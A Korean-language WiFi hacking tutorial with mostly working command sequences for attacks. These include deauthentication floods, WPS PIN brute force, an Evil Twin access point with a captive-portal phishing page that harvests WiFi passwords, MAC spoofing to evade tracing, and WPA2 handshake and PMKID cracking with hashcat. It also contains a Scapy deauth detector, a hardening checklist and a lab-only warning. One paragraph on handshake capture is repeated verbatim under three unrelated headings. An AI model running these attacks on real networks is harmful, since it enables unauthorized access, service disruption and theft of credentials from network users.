# WiFi 해킹 기초 이론

## 무선 네트워크 구조

```
WiFi 프레임 유형
───────────────────────────────
Management Frames (관리 프레임)
  - Beacon: AP가 자신을 알리는 브로드캐스트
  - Probe Request: 클라이언트가 AP 탐색
  - Probe Response: AP의 응답
  - Authentication: 인증 교환
  - Association Request/Response: 연결 요청/응답
  - Deauthentication: 강제 연결 해제

Control Frames (제어 프레임)
  - RTS (Request to Send)
  - CTS (Clear to Send)
  - ACK (Acknowledgment)

Data Frames (데이터 프레임)
  - 실제 페이로드 데이터
───────────────────────────────
```

---

## 1. 무선 보안 프로토콜 역사

### WEP (Wired Equivalent Privacy)

```
발표: 1997년, 802.11 표준
상태: 2004년 폐기 (완전히 파훼됨)

취약점:
  - RC4 암호화에 24비트 IV 재사용
  - 동일 키스트림 재사용 → XOR 공격
  - CRC32 무결성 검증 (암호학적으로 취약)

크랙 시간: 5분 이내 (패킷 수집 후)
명령어: aircrack-ng -b BSSID capture.cap
```

### WPA (Wi-Fi Protected Access)


WPA2 핸드셰이크 캡처는 WPA2 크래킹의 핵심 단계입니다. `airodump-ng`로 대상 AP를 타깃팅하고 `aireplay-ng --deauth`로 연결된 클라이언트를 강제 재연결시켜 4-way 핸드셰이크를 캡처합니다.

```
발표: 2003년 (WEP 긴급 대체)
암호화: TKIP (RC4 기반, 개선된 IV)

취약점:
  - TKIP 취약점 (Beck-Tews Attack)
  - Michael MIC 공격
  - WPA Enterprise: PEAP 취약점

상태: 2012년 이후 사용 비권장
```

### WPA2 (Wi-Fi Protected Access 2)


WPA2 핸드셰이크 캡처는 WPA2 크래킹의 핵심 단계입니다. `airodump-ng`로 대상 AP를 타깃팅하고 `aireplay-ng --deauth`로 연결된 클라이언트를 강제 재연결시켜 4-way 핸드셰이크를 캡처합니다.

```
발표: 2004년
암호화: CCMP/AES (강력한 암호화)
인증: PSK (Personal) 또는 Enterprise (802.1X)

취약점:
  - KRACK (Key Reinstallation Attack, 2017)
  - PMKID Attack (2018, 핸드셰이크 불필요)
  - 약한 비밀번호 딕셔너리 공격
  - WPS PIN 브루트포스

상태: 현재 주류, WPA3로 전환 중
```

### WPA3


WPA2 핸드셰이크 캡처는 WPA2 크래킹의 핵심 단계입니다. `airodump-ng`로 대상 AP를 타깃팅하고 `aireplay-ng --deauth`로 연결된 클라이언트를 강제 재연결시켜 4-way 핸드셰이크를 캡처합니다.

```
발표: 2018년
개선:
  - SAE (Simultaneous Authentication of Equals)
    → 드래곤플라이 핸드셰이크
    → 오프라인 딕셔너리 공격 방지
  - Forward Secrecy (과거 트래픽 보호)
  - 192비트 암호화 스위트 (Enterprise)
  - PMF (Protected Management Frames) 의무화

현존 취약점:
  - Dragonblood (SAE 사이드채널, 2019)
  - WPA3 전환 네트워크에서 다운그레이드
```

---

## 2. 무선 네트워크 스캔

### Airmon-ng - 모니터 모드

airmon-ng으로 무선 인터페이스를 확인하고 모니터 모드를 활성화합니다. 패킷 캡처와 인젝션을 위해 반드시 모니터 모드로 전환해야 합니다.

```bash
# 무선 인터페이스 확인
iwconfig
ip link show

# 모니터 모드 활성화
sudo airmon-ng start wlan0
# → wlan0mon 또는 mon0 인터페이스 생성

# 간섭 프로세스 종료
sudo airmon-ng check kill

# 채널 고정
sudo iwconfig wlan0mon channel 6

# 모니터 모드 비활성화
sudo airmon-ng stop wlan0mon
```

### Airodump-ng - 패킷 캡처

airodump-ng으로 주변의 모든 무선 AP와 클라이언트를 스캔합니다. BSSID, ESSID, 채널, 암호화 방식, 신호 강도 등의 정보를 수집합니다.

```bash
# 모든 AP 스캔
sudo airodump-ng wlan0mon

# 특정 채널 스캔
sudo airodump-ng --channel 1 wlan0mon

# 특정 BSSID 집중 캡처 (핸드셰이크 수집)
sudo airodump-ng \
    --bssid AA:BB:CC:DD:EE:FF \
    --channel 6 \
    --write capture \
    wlan0mon

# 5GHz 대역 스캔
sudo airodump-ng --band a wlan0mon

# 출력 필드 설명
# BSSID: AP의 MAC 주소
# PWR: 신호 강도 (dBm, 음수가 클수록 약함)
# Beacons: 받은 비콘 프레임 수
# #Data: 수집된 데이터 패킷 수
# CH: 채널
# MB: 최대 속도 (Mbps)
# ENC: 암호화 방식
# ESSID: 네트워크 이름
```

### Kismet - 고급 무선 정찰

Kismet 무선 네트워크 탐지기를 설치하고 실행합니다. 숨겨진 SSID, 비인가 AP, 클라이언트 추적 등 고급 무선 정찰 기능을 제공합니다.

```bash
# Kismet 설치 및 실행
sudo apt install kismet
sudo kismet -c wlan0mon

# 웹 인터페이스: http://localhost:2501
# 기본 계정: kismet/kismet

# Kismet 캡처 결과 분석
kismetdb_to_pcap --in wardriving.kismet --out capture.pcap
```

---

## 3. WPA2 핸드셰이크 이해

### 4-Way Handshake 과정

```
클라이언트                           AP
   │                                  │
   │  1. EAPOL-Key (ANonce)           │
   │◄─────────────────────────────────│
   │                                  │
   │  2. EAPOL-Key (SNonce + MIC)     │
   │─────────────────────────────────►│
   │                                  │
   │  3. EAPOL-Key (GTK + MIC)        │
   │◄─────────────────────────────────│
   │                                  │
   │  4. EAPOL-Key (ACK)              │
   │─────────────────────────────────►│

핵심:
  PMK (Pairwise Master Key) = PBKDF2(PSK, SSID)
  PTK = PRF(PMK + ANonce + SNonce + AP_MAC + Client_MAC)
  MIC = HMAC-MD5/SHA1(PTK, EAPOL 데이터)

크랙 원리:
  알려진 SSID + 사전 단어로 PMK 계산
  → PTK 계산
  → MIC 검증
  → 일치 시 비밀번호 발견
```

### Deauthentication 공격 (핸드셰이크 강제 수집)

aireplay-ng로 특정 클라이언트에 Deauthentication 패킷을 전송합니다. 강제 재연결을 유도하여 WPA2 4-way 핸드셰이크를 캡처하기 위해 사용합니다.

```bash
# 특정 클라이언트에 Deauth 패킷 전송
sudo aireplay-ng \
    --deauth 10 \
    -a AA:BB:CC:DD:EE:FF \  # AP MAC
    -c 11:22:33:44:55:66 \  # 클라이언트 MAC
    wlan0mon

# 모든 클라이언트에 브로드캐스트 Deauth
sudo aireplay-ng \
    --deauth 0 \           # 0=무한
    -a AA:BB:CC:DD:EE:FF \ # AP MAC
    wlan0mon

# Deauth와 동시에 핸드셰이크 캡처 (별도 터미널)
sudo airodump-ng \
    --bssid AA:BB:CC:DD:EE:FF \
    --channel 6 \
    --write handshake \
    wlan0mon

# 캡처 파일에서 핸드셰이크 확인
aircrack-ng handshake-01.cap
```

---

## 4. WPS (Wi-Fi Protected Setup) 취약점

### WPS 핀 브루트포스

Reaver 또는 Bully로 WPS PIN 브루트포스를 수행합니다. WPS가 활성화된 AP에서 8자리 PIN을 체계적으로 시도하여 WPA2 키를 복구합니다.

```bash
# WPS 활성화된 AP 탐색
sudo wash -i wlan0mon
# Locked: No → 공격 가능

# Reaver로 WPS PIN 크랙
sudo reaver \
    -i wlan0mon \
    -b AA:BB:CC:DD:EE:FF \
    -v \
    -c 6 \
    --delay=2           # 잠금 방지 딜레이

# Pixiewps (Pixie Dust Attack) - 빠른 오프라인 공격
sudo reaver \
    -i wlan0mon \
    -b AA:BB:CC:DD:EE:FF \
    -K 1 \              # Pixie Dust 활성화
    -v \
    -d 30

# 이론: WPS PIN은 8자리지만 실제로 4+4 두 부분으로 검증
# 총 가능한 경우의 수: 11,000 (10,000 + 1,000)
# 약 4시간이면 모든 PIN 시도 가능
```

---

## 5. Evil Twin (가짜 AP) 공격

### 기본 Evil Twin 설정

합법적 AP를 복제한 Evil Twin AP를 생성하는 기본 설정입니다. hostapd로 가짜 AP를 만들고 dnsmasq로 DHCP/DNS를 제공합니다.

```bash
# 1. 합법적 AP 정보 수집
sudo airodump-ng wlan0mon
# SSID, BSSID, Channel, ENC 정보 기록

# 2. 타겟 AP 클라이언트 강제 연결 해제
sudo aireplay-ng --deauth 100 -a BSSID_TARGET wlan0mon

# 3. 동일 SSID의 가짜 AP 생성 (Hostapd)
cat > /tmp/hostapd.conf << 'EOF'
interface=wlan1
driver=nl80211
ssid=TARGET_SSID
channel=6
hw_mode=g
EOF

sudo hostapd /tmp/hostapd.conf &

# 4. DHCP 서버 설정
sudo apt install dnsmasq
cat > /tmp/dnsmasq.conf << 'EOF'
interface=wlan1
dhcp-range=192.168.1.2,192.168.1.30,255.255.255.0,12h
dhcp-option=3,192.168.1.1
dhcp-option=6,192.168.1.1
server=8.8.8.8
log-queries
log-dhcp
EOF

sudo dnsmasq -C /tmp/dnsmasq.conf

# 5. IP 포워딩 및 NAT
sudo ip addr add 192.168.1.1/24 dev wlan1
sudo sysctl net.ipv4.ip_forward=1
sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
sudo iptables -A FORWARD -i wlan1 -j ACCEPT
```

### Captive Portal (인증 페이지) 설정

아파치 웹서버로 Captive Portal 인증 페이지를 설정합니다. Evil Twin AP에 연결한 피해자를 피싱 페이지로 유도하여 Wi-Fi 비밀번호를 탈취합니다.

```bash
# Apache 웹서버 + 피싱 페이지
sudo apt install apache2
cat > /var/www/html/index.html << 'EOF'
<!DOCTYPE html>
<html>
<head><title>WiFi Login</title></head>
<body>
<h2>WiFi 네트워크 재인증</h2>
<form method="POST" action="/capture.php">
  <p>네트워크 비밀번호:</p>
  <input type="password" name="password" placeholder="WiFi 비밀번호">
  <button type="submit">연결</button>
</form>
</body>
</html>
EOF

# DNS 리다이렉션 (모든 쿼리를 가짜 페이지로)
cat >> /tmp/dnsmasq.conf << 'EOF'
address=/#/192.168.1.1
EOF

# iptables로 HTTP 트래픽 리다이렉션
sudo iptables -t nat -A PREROUTING -i wlan1 -p tcp --dport 80 \
    -j DNAT --to-destination 192.168.1.1:80
sudo iptables -t nat -A PREROUTING -i wlan1 -p tcp --dport 443 \
    -j DNAT --to-destination 192.168.1.1:443
```

---

## 6. 무선 도구 빠른 참조


aircrack-ng 스위트의 핵심 도구들입니다. `airmon-ng`로 무선 카드를 모니터 모드로 전환하고, `airodump-ng`로 주변 AP와 클라이언트를 스캔하며, `aireplay-ng`로 패킷 인젝션(deauth 등)을 수행합니다.

```
airmon-ng    → 모니터 모드 관리
airodump-ng  → 패킷 캡처/AP 스캔
aireplay-ng  → 패킷 주입 (Deauth, ARP replay...)
aircrack-ng  → WEP/WPA 크래킹
airgraph-ng  → 네트워크 그래프 시각화

kismet       → 종합 무선 IDS/센서
wash         → WPS 활성화 AP 스캔
reaver       → WPS PIN 크랙
pixiewps     → Pixie Dust 오프라인 공격
wifite2      → 자동화 WiFi 크래킹
airgeddon    → 올인원 무선 공격 프레임워크
bettercap    → MITM/Evil Twin 자동화
```

---

## 7. 실습 환경 구성

```python
#!/usr/bin/env python3
"""
Scapy 기반 WiFi AP 스캔 및 Deauthentication 탐지 도구
사용: sudo python3 wifi_scanner.py --iface wlan0mon [--timeout 30] [--detect-deauth]
주의: 모니터 모드 인터페이스 필요 (airmon-ng start wlan0)
"""

from __future__ import annotations

import argparse
import signal
import sys
import time
from collections import Counter, defaultdict
from dataclasses import dataclass, field
from datetime import datetime
from typing import Optional

try:
    from scapy.all import sniff, conf
    from scapy.layers.dot11 import (
        Dot11, Dot11Beacon, Dot11Elt, Dot11Deauth,
        Dot11Disas, Dot11ProbeReq, RadioTap,
    )
    HAS_SCAPY = True
except ImportError:
    HAS_SCAPY = False


# ------------------------------------------------------------------ #
#  데이터 구조
# ------------------------------------------------------------------ #
@dataclass
class APInfo:
    bssid: str
    ssid: str
    channel: int
    rssi: int
    enc: str
    vendor: str = ""
    first_seen: str = field(default_factory=lambda: datetime.now().strftime("%H:%M:%S"))
    last_seen: str = field(default_factory=lambda: datetime.now().strftime("%H:%M:%S"))
    beacon_count: int = 0


@dataclass
class DeauthAlert:
    timestamp: str
    src_mac: str
    dst_mac: str
    bssid: str
    reason_code: int
    frame_type: str  # Deauth | Disassoc

    _REASON_CODES = {
        1: "Unspecified reason",
        2: "Previous auth no longer valid",
        3: "Deauth leaving BSS",
        4: "Inactivity",
        7: "Class 3 frame received (가장 흔한 스푸핑 코드)",
        8: "Disassoc leaving BSS",
    }

    def reason_str(self) -> str:
        return self._REASON_CODES.get(self.reason_code, f"Code {self.reason_code}")


# ------------------------------------------------------------------ #
#  스캐너
# ------------------------------------------------------------------ #
class WiFiScanner:
    def __init__(self, iface: str, detect_deauth: bool = False) -> None:
        self.iface = iface
        self.detect_deauth = detect_deauth
        self.aps: dict[str, APInfo] = {}
        self.deauth_alerts: list[DeauthAlert] = []
        self.deauth_counter: Counter = Counter()
        self._stop = False

    # ── 패킷 핸들러 ───────────────────────────────────────────────────
    def _handle(self, pkt) -> None:
        if not pkt.haslayer(Dot11):
            return

        # AP Beacon 처리
        if pkt.haslayer(Dot11Beacon):
            self._process_beacon(pkt)

        # Deauth / Disassoc 탐지
        if self.detect_deauth:
            if pkt.haslayer(Dot11Deauth) or pkt.haslayer(Dot11Disas):
                self._process_deauth(pkt)

    def _process_beacon(self, pkt) -> None:
        dot11 = pkt[Dot11]
        bssid = dot11.addr2 or ""
        if not bssid:
            return

        # SSID 추출
        ssid = ""
        channel = 0
        enc = "OPEN"
        elt = pkt.getlayer(Dot11Elt)
        while elt:
            if elt.ID == 0:    # SSID
                try:
                    ssid = elt.info.decode("utf-8", errors="replace")
                except Exception:
                    ssid = "[binary]"
            elif elt.ID == 3:  # DS Parameter Set (채널)
                try:
                    channel = int.from_bytes(elt.info, "little")
                except Exception:
                    pass
            elif elt.ID == 48: # RSN Information (WPA2)
                enc = "WPA2"
            elif elt.ID == 221 and elt.info[:4] == b"\x00\x50\xf2\x01":  # WPA1
                if enc != "WPA2":
                    enc = "WPA"
            elt = elt.payload.getlayer(Dot11Elt) if elt.payload else None

        # RadioTap에서 신호 강도
        rssi = 0
        if pkt.haslayer(RadioTap):
            rssi = getattr(pkt[RadioTap], "dBm_AntSignal", 0) or 0

        ts = datetime.now().strftime("%H:%M:%S")
        if bssid in self.aps:
            ap = self.aps[bssid]
            ap.last_seen = ts
            ap.beacon_count += 1
            ap.rssi = rssi
        else:
            self.aps[bssid] = APInfo(
                bssid=bssid, ssid=ssid or "(hidden)",
                channel=channel, rssi=rssi, enc=enc,
            )
            print(f"  [+] AP: {ssid or '(hidden)':<30} BSSID:{bssid}  CH:{channel:2d}  {enc}  RSSI:{rssi}dBm")

    def _process_deauth(self, pkt) -> None:
        dot11 = pkt[Dot11]
        src = dot11.addr2 or "??"
        dst = dot11.addr1 or "??"
        bssid = dot11.addr3 or src

        layer = pkt[Dot11Deauth] if pkt.haslayer(Dot11Deauth) else pkt[Dot11Disas]
        frame_type = "Deauth" if pkt.haslayer(Dot11Deauth) else "Disassoc"
        reason = getattr(layer, "reason", 0)

        alert = DeauthAlert(
            timestamp=datetime.now().strftime("%H:%M:%S"),
            src_mac=src,
            dst_mac=dst,
            bssid=bssid,
            reason_code=reason,
            frame_type=frame_type,
        )
        self.deauth_alerts.append(alert)
        self.deauth_counter[src] += 1

        # 초당 10회 이상 → 공격 경보
        count = self.deauth_counter[src]
        warning = " [!!! DEAUTH ATTACK DETECTED !!!]" if count >= 10 else ""
        print(
            f"  [{alert.timestamp}] {frame_type:8s} {src} → {dst}  "
            f"이유:{alert.reason_str()}  총:{count}회{warning}"
        )

    # ── 스캔 실행 ─────────────────────────────────────────────────────
    def start(self, timeout: int = 0) -> None:
        def _sigint(sig, frame):
            print("\n[*] 스캔 중단...", file=sys.stderr)
            self._stop = True

        signal.signal(signal.SIGINT, _sigint)
        print(f"[*] WiFi 스캔 시작: {self.iface}", file=sys.stderr)
        if self.detect_deauth:
            print("[*] Deauth/Disassoc 탐지 활성화", file=sys.stderr)

        sniff(
            iface=self.iface,
            prn=self._handle,
            store=False,
            timeout=timeout if timeout > 0 else None,
            stop_filter=lambda _: self._stop,
        )

    def print_summary(self) -> None:
        print(f"\n{'='*65}")
        print(f"발견된 AP: {len(self.aps)}개")
        print(f"\n{'BSSID':<20} {'SSID':<30} {'CH':>4} {'ENC':<6} {'RSSI':>6}")
        print("-" * 70)
        for ap in sorted(self.aps.values(), key=lambda a: -a.rssi):
            print(f"{ap.bssid:<20} {ap.ssid:<30} {ap.channel:>4} {ap.enc:<6} {ap.rssi:>5}dBm")

        if self.deauth_alerts:
            print(f"\nDeauth/Disassoc 탐지: {len(self.deauth_alerts)}회")
            print("\n[상위 발신자]")
            for mac, cnt in self.deauth_counter.most_common(5):
                label = " ← 공격 의심" if cnt >= 10 else ""
                print(f"  {mac}  {cnt}회{label}")


# ------------------------------------------------------------------ #
#  CLI
# ------------------------------------------------------------------ #
def build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(
        description="Scapy 기반 WiFi AP 스캔 및 Deauth 탐지 도구",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="예시:\n"
               "  sudo python3 wifi_scanner.py --iface wlan0mon\n"
               "  sudo python3 wifi_scanner.py --iface wlan0mon --timeout 60 --detect-deauth",
    )
    parser.add_argument(
        "--iface", required=True,
        help="모니터 모드 무선 인터페이스 (예: wlan0mon)",
    )
    parser.add_argument(
        "--timeout", type=int, default=0,
        metavar="SEC",
        help="스캔 시간(초). 0=무한 (기본: 0)",
    )
    parser.add_argument(
        "--detect-deauth", action="store_true",
        help="Deauthentication/Disassociation 패킷 탐지 활성화",
    )
    return parser


def main() -> None:
    if not HAS_SCAPY:
        print("scapy 라이브러리 필요: pip install scapy", file=sys.stderr)
        sys.exit(1)

    parser = build_parser()
    args = parser.parse_args()

    scanner = WiFiScanner(iface=args.iface, detect_deauth=args.detect_deauth)
    scanner.start(timeout=args.timeout)
    scanner.print_summary()


if __name__ == "__main__":
    main()
```

---

## 8. MAC 주소 스푸핑 (익명성 확보)

### MAC 주소 변경 이유와 방법

macchanger로 MAC 주소를 변경하여 무선 공격 시 추적을 어렵게 합니다. 공격 전에 실제 MAC 주소를 숨기는 것이 opsec의 기본입니다.

```bash
# MAC 주소란?
# 네트워크 인터페이스에 하드웨어 수준으로 부여된 고유 식별자
# 패킷이 올바른 장치에 전달될 수 있도록 사용
# 네트워크 로그에 MAC 주소 기록 → 추적 가능

# macchanger로 MAC 주소 변경 (Kali 내장)
sudo ifconfig wlan0 down                  # 인터페이스 비활성화
sudo macchanger --random wlan0            # 랜덤 MAC 설정
sudo macchanger -m AA:BB:CC:DD:EE:FF wlan0  # 특정 MAC으로 변경
sudo ifconfig wlan0 up                    # 인터페이스 재활성화

# 변경 확인
macchanger --show wlan0
# Permanent MAC: 기존 하드웨어 MAC
# Current MAC: 현재 사용 중인 (변경된) MAC

# ip 명령으로 변경 (현대적 방법)
sudo ip link set wlan0 down
sudo ip link set wlan0 address AA:BB:CC:DD:EE:FF
sudo ip link set wlan0 up
```

---

## 9. WPA2 크랙 실전 — 핸드셰이크 수집부터 크랙까지

### 단계별 전체 흐름

무선 해킹의 전체 단계별 절차입니다. 모니터 모드 활성화 → AP 스캔 → 핸드셰이크 캡처 → 오프라인 크래킹 순서로 진행합니다.

```bash
# 1단계: 모니터 모드 활성화 + MAC 변경
sudo airmon-ng check kill
sudo airmon-ng start wlan0
# → wlan0mon 생성

# 2단계: 타겟 AP 스캔
sudo airodump-ng wlan0mon
# BSSID와 CH(채널) 기록

# 3단계: 핸드셰이크 캡처
sudo airodump-ng --bssid AA:BB:CC:DD:EE:FF --channel 6 --write capture wlan0mon

# 4단계: (다른 터미널) Deauth로 재연결 유도
sudo aireplay-ng --deauth 5 -a AA:BB:CC:DD:EE:FF wlan0mon
# → 클라이언트 재연결 시 핸드셰이크 캡처됨
# → airodump-ng 화면 우상단에 "WPA handshake: AA:BB:CC:DD:EE:FF" 표시

# 5단계: 핸드셰이크 크랙
aircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap
# 또는 hashcat으로 GPU 가속 크랙
hcxtools/hcxpcapngtool -o hash.hc22000 capture-01.cap
hashcat -a 0 -m 22000 hash.hc22000 wordlist.txt
```

### PMKID 공격 (클라이언트 없이 크랙 — 2018)

PMKID 공격은 클라이언트 연결 없이도 AP에서 PMKID를 추출하여 WPA2 키를 오프라인으로 크래킹합니다. 2018년 발견된 기법으로 핸드셰이크 캡처보다 효율적입니다.

```bash
# 클라이언트가 연결되지 않아도 AP의 PMKID 수집 가능
# hcxdumptool 사용

sudo hcxdumptool -i wlan0mon -o pmkid.pcapng --enable_status=1

# PMKID 추출
hcxtools/hcxpcapngtool -o hash.hc22000 pmkid.pcapng

# hashcat으로 크랙 (22000 = WPA-PMKID-PBKDF2)
hashcat -a 0 -m 22000 hash.hc22000 /usr/share/wordlists/rockyou.txt
hashcat -a 3 -m 22000 hash.hc22000 ?d?d?d?d?d?d?d?d  # 8자리 숫자 브루트포스
```

### 네트워크 보안 강화 권고 (방어 관점)
```
WPA2 / WPA3 보안 강화:
  1. 강력한 비밀번호 설정 (20자 이상, 대소문자+숫자+특수문자)
  2. WPA3 SAE 모드 사용 (Dragonfly 핸드셰이크 — 오프라인 딕셔너리 공격 방지)
  3. WPS 비활성화 (PIN 브루트포스 취약)
  4. PMF (Protected Management Frames) 활성화 — Deauth 공격 방어
  5. 802.1X Enterprise 인증 사용 (기업 환경)
  6. SSID 숨김은 무의미 (Probe Request로 탐지 가능)
  7. MAC 필터링은 MAC 스푸핑으로 우회 가능 → 단독 방어 수단 부적절
```

> **실습 환경에서만 수행하세요.**
> Deauth 공격, Evil Twin은 타인의 네트워크에 수행 시 전파법 위반입니다.
